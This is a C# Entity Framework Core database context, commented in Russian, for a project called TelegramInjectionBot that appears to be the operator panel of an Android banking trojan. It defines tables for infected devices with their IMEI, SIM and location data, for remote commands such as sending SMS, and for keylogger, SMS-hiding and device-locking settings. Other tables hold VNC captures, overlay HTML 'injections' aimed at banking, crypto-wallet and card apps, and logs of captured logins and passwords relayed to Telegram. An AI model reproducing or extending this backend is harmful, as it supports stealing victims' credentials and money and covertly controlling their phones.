using Microsoft.EntityFrameworkCore;

namespace TelegramInjectionBot.Data;

public partial class EFContext : DbContext
{
    public EFContext()
    {
    }

    public EFContext(DbContextOptions<EFContext> options)
        : base(options)
    {
    }

    public virtual DbSet<AutoCommand> AutoCommands { get; set; }
    public virtual DbSet<Bot> Bots { get; set; }
    public virtual DbSet<BotCommand> BotCommands { get; set; }
    public virtual DbSet<BotFile> BotFiles { get; set; }
    public virtual DbSet<BotFilemanager> BotFilemanagers { get; set; }
    public virtual DbSet<BotInjection> BotInjections { get; set; }
    public virtual DbSet<BotLog> BotLogs { get; set; }
    public virtual DbSet<BotVnc> BotVncs { get; set; }
    public virtual DbSet<Injection> Injections { get; set; }
    public virtual DbSet<InjectionFile> InjectionFiles { get; set; }
    public virtual DbSet<InjectionSession> InjectionSessions { get; set; }
    public virtual DbSet<Migration> Migrations { get; set; }
    public virtual DbSet<ModelHasPermission> ModelHasPermissions { get; set; }
    public virtual DbSet<ModelHasRole> ModelHasRoles { get; set; }
    public virtual DbSet<Permission> Permissions { get; set; }
    public virtual DbSet<Role> Roles { get; set; }
    public virtual DbSet<Setting> Settings { get; set; }
    public virtual DbSet<User> Users { get; set; }
    public virtual DbSet<UserBotTimestamp> UserBotTimestamps { get; set; }
    public virtual DbSet<UserTag> UserTags { get; set; }
    public virtual DbSet<UserTelegramAttempt> UserTelegramAttempts { get; set; }
    public virtual DbSet<UserTelegramInjection> UserTelegramInjections { get; set; }
    public virtual DbSet<UserTelegramBot> UserTelegramBots { get; set; }
    public virtual DbSet<UserTelegramMessage> UserTelegramMessages { get; set; }
    public virtual DbSet<UserTimestamp> UserTimestamps { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        modelBuilder.UseCollation("utf8mb4_0900_ai_ci")
            .HasCharSet("utf8mb4");

        modelBuilder.Entity<AutoCommand>(entity =>
        {
            entity.ToTable("auto_commands");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.Data)
                .HasColumnType("json")
                .HasColumnName("data");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");
        });

        modelBuilder.Entity<Bot>(entity =>
        {
            entity.ToTable("bots");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.Tag, "bots_tag_index");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Comment)
                .HasMaxLength(255)
                .HasColumnName("comment");

            entity.Property(e => e.Country)
                .HasMaxLength(255)
                .HasColumnName("country")
                .HasComment("Название страны устройства.");

            entity.Property(e => e.CountryCode)
                .HasMaxLength(255)
                .HasColumnName("country_code")
                .HasComment("Код страны устройства.");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.CurrentFileManagerPath)
                .HasMaxLength(255)
                .HasColumnName("current_file_manager_path");

            entity.Property(e => e.Ip)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("ip")
                .HasComment("ip адрес устройства. С портом");

            entity.Property(e => e.IsBlacklisted).HasColumnName("is_blacklisted");

            entity.Property(e => e.IsFavorite).HasColumnName("is_favorite");

            entity.Property(e => e.IsNew)
                .IsRequired()
                .HasColumnName("is_new")
                .HasDefaultValueSql("'1'");

            entity.Property(e => e.LastConnection)
                .HasColumnType("timestamp")
                .HasColumnName("last_connection")
                .HasComment("Дата подключения устройства.");

            entity.Property(e => e.Location)
                .HasColumnType("json")
                .HasColumnName("location")
                .HasComment(
                    "JSON местоположения устройства. Формат:\n                    {\n                        lat:100,\n                        lon:100\n                    }\n            ");

            entity.Property(e => e.Metadata)
                .HasColumnType("json")
                .HasColumnName("metadata")
                .HasComment(
                    "JSON массив с метаданными устройства. Формат: {android:'10',model:'Samsung Galaxy S 100','battery_level':15,'IMEI':14}");

            entity.Property(e => e.Permissions)
                .HasColumnType("json")
                .HasColumnName("permissions")
                .HasComment(
                    "JSON массив привилегий устройства. Формат:\n                    {\n                        \"all_permission\": \"true\",\n                        \"sms_permission\": \"false\",\n                        \"overlay_permission\": \"true\",\n                        \"accounts_permission\": \"true\",\n                        \"contacts_permission\": \"true\",\n                        \"notification_permission\": \"false\"\n                    }\n                ");

            entity.Property(e => e.Settings)
                .IsRequired()
                .HasColumnType("json")
                .HasColumnName("settings")
                .HasComment(
                    "JSON массив с настройками. Формат: {\"hideSMS\":true,\"lockDevice\":true,\"offSound\":true,\"keylogger\":true,\"clearPush\":true,\"readPush\":true,\"arrayUrl\":[\"https://yandex.ru/\", \"https://yandex.ru/\"]}");

            entity.Property(e => e.SimData)
                .HasColumnType("json")
                .HasColumnName("sim_data")
                .HasComment(
                    "JSON массив с информацией о сим-картах устройства. Формат: [{\"operator\":\"Android\",\"phone_number\":\"+15555215554\",\"isDualSim\":\"false\",\"operator1\":\"\",\"phone_number1\":\"\"}]");

            entity.Property(e => e.SubInfo)
                .HasColumnType("json")
                .HasColumnName("sub_info")
                .HasComment(
                    "JSON массив с дополнительной информацией об устройстве. Формат:\n                    {\n                        \"admin\": \"false\",\n                        \"screen\": \"true\",\n                        \"protect\": \"0\",\n                        \"isDozeMode\": \"true\",\n                        \"batteryLevel\": \"98\",\n                        \"accessibility\": \"true\",\n                        \"isKeyguardLocked\": \"false\"\n                    }\n                ");

            entity.Property(e => e.Tag)
                .HasColumnName("tag")
                .HasComment("Тег.");

            entity.Property(e => e.UpdateSettings)
                .HasColumnName("update_settings")
                .HasComment("Флаг для обновления настроек бота.");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.Property(e => e.WorkingTime)
                .HasColumnName("working_time")
                .HasComment("Время работы устройства в секундах.");
        });

        modelBuilder.Entity<BotCommand>(entity =>
        {
            entity.ToTable("bot_commands");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.BotId, "bot_commands_bot_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.Command)
                .IsRequired()
                .HasColumnType("json")
                .HasColumnName("command")
                .HasComment("json массив настроек: {command:\"sendSMS\",payload:{phone:\"123456\",text:\"52314234\"}}");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.IsProcessed)
                .HasColumnName("is_processed")
                .HasComment("Флаг, по которому можно понять - обработана ли команда, или нет");

            entity.Property(e => e.RunAt)
                .HasColumnType("timestamp")
                .HasColumnName("run_at")
                .HasComment(
                    "Запуск комманды в указанное время, формат Y-m-d H:i:s. Если указано NULL - запускать сразу");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.BotCommands)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("bot_commands_bot_id_foreign");
        });

        modelBuilder.Entity<BotFile>(entity =>
        {
            entity.ToTable("bot_files");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.BotId, "bot_files_bot_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.Content)
                .IsRequired()
                .HasColumnType("json")
                .HasColumnName("content");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.Path)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("path");

            entity.Property(e => e.StoredFilePath)
                .HasMaxLength(255)
                .HasColumnName("stored_file_path");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.BotFiles)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("bot_files_bot_id_foreign");
        });

        modelBuilder.Entity<BotFilemanager>(entity =>
        {
            entity.ToTable("bot_filemanager");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.BotId, "bot_filemanager_bot_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.Info)
                .IsRequired()
                .HasColumnType("json")
                .HasColumnName("info");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.BotFilemanagers)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("bot_filemanager_bot_id_foreign");
        });

        modelBuilder.Entity<BotInjection>(entity =>
        {
            entity.ToTable("bot_injections");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.Application, "bot_injections_application_index");

            entity.HasIndex(e => e.BotId, "bot_injections_bot_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Application)
                .IsRequired()
                .HasColumnName("application")
                .HasComment("Название пакета приложения. Пример: org.app.name");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.IsActive).HasColumnName("is_active");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.BotInjections)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("bot_injections_bot_id_foreign");
        });

        modelBuilder.Entity<BotLog>(entity =>
        {
            entity.ToTable("bot_logs");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.Application, "bot_logs_application_index");

            entity.HasIndex(e => e.BotId, "bot_logs_bot_id_foreign");

            entity.HasIndex(e => e.TelegramAccepted, "bot_logs_telegram_accepted_index");

            entity.HasIndex(e => e.Type, "bot_logs_type_index");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Application)
                .HasColumnName("application")
                .HasComment("Название пакета приложения. Пример: org.app.name. Необязательный параметр");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.Comment)
                .HasMaxLength(255)
                .HasColumnName("comment");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.Log)
                .IsRequired()
                .HasColumnType("json")
                .HasColumnName("log")
                .HasComment(
                    "JSON массив с данными инжекта, в любом формате. {\"login\": \"log\", \"password\": \"pass\", ...}");

            entity.Property(e => e.TelegramAccepted).HasColumnName("telegram_accepted");

            entity.Property(e => e.Type)
                .IsRequired()
                .HasColumnName("type")
                .HasComment(
                    "Тип лога. Доступные типы: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails', 'sms', 'events', 'googleauth', 'hidesms', 'keylogger', 'mail', 'otheraccounts', 'phonenumber', 'pushlist', 'ussd', 'stealers'");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.BotLogs)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("bot_logs_bot_id_foreign");
        });

        modelBuilder.Entity<BotVnc>(entity =>
        {
            entity.ToTable("bot_vnc");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.BotId, "bot_vnc_bot_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.ImageBlob).HasColumnName("image_blob");

            entity.Property(e => e.Tree)
                .IsRequired()
                .HasColumnType("json")
                .HasColumnName("tree");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.BotVncs)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("bot_vnc_bot_id_foreign");
        });

        modelBuilder.Entity<Injection>(entity =>
        {
            entity.ToTable("injections");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.Application, "injections_application_unique")
                .IsUnique();

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Application)
                .IsRequired()
                .HasColumnName("application")
                .HasComment("Приложение");

            entity.Property(e => e.Auto)
                .HasColumnName("auto")
                .HasComment("Флаг определяющий автоинжект.");

            entity.Property(e => e.Html)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("html")
                .HasComment("Относительный путь к html");

            entity.Property(e => e.Image)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("image")
                .HasComment("Относительный путь к иконке");

            entity.Property(e => e.Name)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("name")
                .HasComment("Название инжекта для панели");

            entity.Property(e => e.Type)
                .IsRequired()
                .HasColumnType("enum('banks','crypt','wallets','shops','credit_cards','emails')")
                .HasColumnName("type")
                .HasComment("Доступные варианты: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails'");
        });

        modelBuilder.Entity<InjectionFile>(entity =>
        {
            entity.HasKey(e => e.InjectionId)
                .HasName("PRIMARY");

            entity.ToTable("injection_files");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.Property(e => e.InjectionId)
                .ValueGeneratedOnAdd()
                .HasColumnName("injection_id");

            entity.Property(e => e.HtmlBlob).HasColumnName("html_blob");

            entity.Property(e => e.ImageBlob).HasColumnName("image_blob");

            entity.HasOne(d => d.Injection)
                .WithOne(p => p.InjectionFile)
                .HasForeignKey<InjectionFile>(d => d.InjectionId)
                .HasConstraintName("injection_files_injection_id_foreign");
        });

        modelBuilder.Entity<InjectionSession>(entity =>
        {
            entity.ToTable("injection_sessions");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Action)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("action")
                .HasDefaultValueSql("'default'");

            entity.Property(e => e.Application)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("application");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("bot_id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.Data)
                .HasColumnType("json")
                .HasColumnName("data");

            entity.Property(e => e.IsClosed).HasColumnName("is_closed");

            entity.Property(e => e.SessionId)
                .IsRequired()
                .HasMaxLength(36)
                .HasColumnName("session_id");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");
        });

        modelBuilder.Entity<Migration>(entity =>
        {
            entity.ToTable("migrations");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Batch).HasColumnName("batch");

            entity.Property(e => e.Migration1)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("migration");
        });

        modelBuilder.Entity<ModelHasPermission>(entity =>
        {
            entity.HasKey(e => new { e.PermissionId, e.ModelId, e.ModelType })
                .HasName("PRIMARY")
                .HasAnnotation("MySql:IndexPrefixLength", new[] { 0, 0, 0 });

            entity.ToTable("model_has_permissions");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => new { e.ModelId, e.ModelType }, "model_has_permissions_model_id_model_type_index");

            entity.Property(e => e.PermissionId).HasColumnName("permission_id");

            entity.Property(e => e.ModelId).HasColumnName("model_id");

            entity.Property(e => e.ModelType).HasColumnName("model_type");

            entity.HasOne(d => d.Permission)
                .WithMany(p => p.ModelHasPermissions)
                .HasForeignKey(d => d.PermissionId)
                .HasConstraintName("model_has_permissions_permission_id_foreign");
        });

        modelBuilder.Entity<ModelHasRole>(entity =>
        {
            entity.HasKey(e => new { e.RoleId, e.ModelId, e.ModelType })
                .HasName("PRIMARY")
                .HasAnnotation("MySql:IndexPrefixLength", new[] { 0, 0, 0 });

            entity.ToTable("model_has_roles");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => new { e.ModelId, e.ModelType }, "model_has_roles_model_id_model_type_index");

            entity.Property(e => e.RoleId).HasColumnName("role_id");

            entity.Property(e => e.ModelId).HasColumnName("model_id");

            entity.Property(e => e.ModelType).HasColumnName("model_type");

            entity.HasOne(d => d.Role)
                .WithMany(p => p.ModelHasRoles)
                .HasForeignKey(d => d.RoleId)
                .HasConstraintName("model_has_roles_role_id_foreign");
        });

        modelBuilder.Entity<Permission>(entity =>
        {
            entity.ToTable("permissions");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => new { e.Name, e.GuardName }, "permissions_name_guard_name_unique")
                .IsUnique();

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.GuardName)
                .IsRequired()
                .HasColumnName("guard_name");

            entity.Property(e => e.Name)
                .IsRequired()
                .HasColumnName("name");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasMany(d => d.Roles)
                .WithMany(p => p.Permissions)
                .UsingEntity<Dictionary<string, object>>(
                    "RoleHasPermission",
                    l => l.HasOne<Role>().WithMany().HasForeignKey("RoleId")
                        .HasConstraintName("role_has_permissions_role_id_foreign"),
                    r => r.HasOne<Permission>().WithMany().HasForeignKey("PermissionId")
                        .HasConstraintName("role_has_permissions_permission_id_foreign"),
                    j =>
                    {
                        j.HasKey("PermissionId", "RoleId").HasName("PRIMARY")
                            .HasAnnotation("MySql:IndexPrefixLength", new[] { 0, 0 });

                        j.ToTable("role_has_permissions").UseCollation("utf8mb4_unicode_ci");

                        j.HasIndex(new[] { "RoleId" }, "role_has_permissions_role_id_foreign");

                        j.IndexerProperty<ulong>("PermissionId").HasColumnName("permission_id");

                        j.IndexerProperty<ulong>("RoleId").HasColumnName("role_id");
                    });
        });

        modelBuilder.Entity<Role>(entity =>
        {
            entity.ToTable("roles");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => new { e.Name, e.GuardName }, "roles_name_guard_name_unique")
                .IsUnique();

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.GuardName)
                .IsRequired()
                .HasColumnName("guard_name");

            entity.Property(e => e.Name)
                .IsRequired()
                .HasColumnName("name");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");
        });

        modelBuilder.Entity<Setting>(entity =>
        {
            entity.ToTable("settings");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");
        });

        modelBuilder.Entity<User>(entity =>
        {
            entity.ToTable("users");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.CreatedUserId, "users_created_user_id_foreign");

            entity.HasIndex(e => e.Token, "users_token_unique")
                .IsUnique();

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.CreatedUserId).HasColumnName("created_user_id");

            entity.Property(e => e.Email)
                .HasMaxLength(255)
                .HasColumnName("email")
                .HasComment("Адрес электронной почты. Nullable");

            entity.Property(e => e.ExpiredAt)
                .HasColumnType("timestamp")
                .HasColumnName("expired_at")
                .HasComment("Дата истечения токена.");

            entity.Property(e => e.IsPaused)
                .HasColumnName("is_paused")
                .HasComment("Приостановлен ли пользователь.");

            entity.Property(e => e.Name)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("name")
                .HasComment("Имя пользователя");

            entity.Property(e => e.Password)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("password")
                .HasComment("Закриптованный токен пользователя");

            entity.Property(e => e.TelegramId)
                .HasMaxLength(255)
                .HasColumnName("telegram_id");

            entity.Property(e => e.Token)
                .IsRequired()
                .HasColumnName("token")
                .HasComment("Незакриптованный токен пользователя");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.HasOne(d => d.CreatedUser)
                .WithMany(p => p.InverseCreatedUser)
                .HasForeignKey(d => d.CreatedUserId)
                .OnDelete(DeleteBehavior.Cascade)
                .HasConstraintName("users_created_user_id_foreign");

            entity.Property(e => e.FailedAuthAttempts)
                .HasColumnName("failed_auth_attempts");

            entity.Property(e => e.TelegramAuthCode)
                .HasColumnName("telegram_auth_code");
        });

        modelBuilder.Entity<UserBotTimestamp>(entity =>
        {
            entity.ToTable("user_bot_timestamp");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.Application, "user_bot_timestamp_application_index");

            entity.HasIndex(e => e.BotId, "user_bot_timestamp_bot_id_index");

            entity.HasIndex(e => e.UserId, "user_bot_timestamp_user_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Application)
                .IsRequired()
                .HasColumnName("application");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id");

            entity.Property(e => e.UserId).HasColumnName("user_id");

            entity.Property(e => e.VisitedAt)
                .HasColumnType("timestamp")
                .HasColumnName("visited_at");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.UserBotTimestamps)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("user_bot_timestamp_bot_id_foreign");

            entity.HasOne(d => d.User)
                .WithMany(p => p.UserBotTimestamps)
                .HasForeignKey(d => d.UserId)
                .HasConstraintName("user_bot_timestamp_user_id_foreign");
        });

        modelBuilder.Entity<UserTag>(entity =>
        {
            entity.ToTable("user_tags");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.Tag, "user_tags_tag_index");

            entity.HasIndex(e => e.UserId, "user_tags_user_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Tag)
                .IsRequired()
                .HasColumnName("tag");

            entity.Property(e => e.UserId).HasColumnName("user_id");

            entity.HasOne(d => d.User)
                .WithMany(p => p.UserTags)
                .HasForeignKey(d => d.UserId)
                .HasConstraintName("user_tags_user_id_foreign");
        });

        modelBuilder.Entity<UserTelegramAttempt>(entity =>
        {
            entity.ToTable("user_telegram_attempts");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.UserId, "user_telegram_attempts_user_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Attempts)
                .HasColumnName("attempts")
                .HasDefaultValueSql("'5'");

            entity.Property(e => e.CreatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("created_at");

            entity.Property(e => e.SecretWord)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("secret_word");

            entity.Property(e => e.UpdatedAt)
                .HasColumnType("timestamp")
                .HasColumnName("updated_at");

            entity.Property(e => e.UserId).HasColumnName("user_id");

            entity.HasOne(d => d.User)
                .WithMany(p => p.UserTelegramAttempts)
                .HasForeignKey(d => d.UserId)
                .HasConstraintName("user_telegram_attempts_user_id_foreign");
        });

        modelBuilder.Entity<UserTelegramInjection>(entity =>
        {
            entity.ToTable("user_telegram_injections");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.BotId, "user_telegram_injections_bot_id_foreign");

            entity.HasIndex(e => e.UserId, "user_telegram_injections_user_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.Application)
                .IsRequired()
                .HasMaxLength(255)
                .HasColumnName("application");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id")
                .IsFixedLength();

            entity.Property(e => e.UserId).HasColumnName("user_id");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.UserTelegramInjections)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("user_telegram_injections_bot_id_foreign");

            entity.HasOne(d => d.User)
                .WithMany(p => p.UserTelegramInjections)
                .HasForeignKey(d => d.UserId)
                .HasConstraintName("user_telegram_injections_user_id_foreign");
        });

        modelBuilder.Entity<UserTelegramBot>(entity =>
        {
            entity.ToTable("user_telegram_bots");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.BotId, "user_telegram_bots_bot_id_foreign");

            entity.HasIndex(e => e.UserId, "user_telegram_bots_user_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.BotId)
                .IsRequired()
                .HasColumnName("bot_id")
                .IsFixedLength();

            entity.Property(e => e.UserId).HasColumnName("user_id");

            entity.HasOne(d => d.Bot)
                .WithMany(p => p.UserTelegramBots)
                .HasForeignKey(d => d.BotId)
                .HasConstraintName("user_telegram_bots_bot_id_foreign");

            entity.HasOne(d => d.User)
                .WithMany(p => p.UserTelegramBots)
                .HasForeignKey(d => d.UserId)
                .HasConstraintName("user_telegram_bots_user_id_foreign");
        });

        modelBuilder.Entity<UserTelegramMessage>(entity =>
        {
            entity.ToTable("user_telegram_messages");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.HasIndex(e => e.UserId, "user_telegram_bots_user_id_foreign");

            entity.Property(e => e.Id).HasColumnName("id");

            entity.Property(e => e.UserId).HasColumnName("user_id");

            entity.HasOne(d => d.User)
                .WithMany(p => p.UserTelegramMessages)
                .HasForeignKey(d => d.UserId)
                .HasConstraintName("user_telegram_bots_user_id_foreign");
        });

        modelBuilder.Entity<UserTimestamp>(entity =>
        {
            entity.HasKey(e => e.UserId)
                .HasName("PRIMARY");

            entity.ToTable("user_timestamps");

            entity.UseCollation("utf8mb4_unicode_ci");

            entity.Property(e => e.UserId)
                .ValueGeneratedNever()
                .HasColumnName("user_id");

            entity.Property(e => e.Banks)
                .HasColumnType("timestamp")
                .HasColumnName("banks");

            entity.Property(e => e.Bots)
                .HasColumnType("timestamp")
                .HasColumnName("bots");

            entity.Property(e => e.CreditCards)
                .HasColumnType("timestamp")
                .HasColumnName("credit_cards");

            entity.Property(e => e.Crypt)
                .HasColumnType("timestamp")
                .HasColumnName("crypt");

            entity.Property(e => e.Emails)
                .HasColumnType("timestamp")
                .HasColumnName("emails");

            entity.Property(e => e.Events)
                .HasColumnType("timestamp")
                .HasColumnName("events");

            entity.Property(e => e.PermissionlessBots)
                .HasColumnType("timestamp")
                .HasColumnName("permissionless_bots");

            entity.Property(e => e.Shops)
                .HasColumnType("timestamp")
                .HasColumnName("shops");

            entity.Property(e => e.SmartInjections)
                .HasColumnType("timestamp")
                .HasColumnName("smart_injections");

            entity.Property(e => e.Stealers)
                .HasColumnType("timestamp")
                .HasColumnName("stealers");

            entity.Property(e => e.Wallets)
                .HasColumnType("timestamp")
                .HasColumnName("wallets");

            entity.HasOne(d => d.User)
                .WithOne(p => p.UserTimestamp)
                .HasForeignKey<UserTimestamp>(d => d.UserId)
                .HasConstraintName("user_timestamps_user_id_foreign");
        });

        OnModelCreatingPartial(modelBuilder);
    }

    partial void OnModelCreatingPartial(ModelBuilder modelBuilder);
}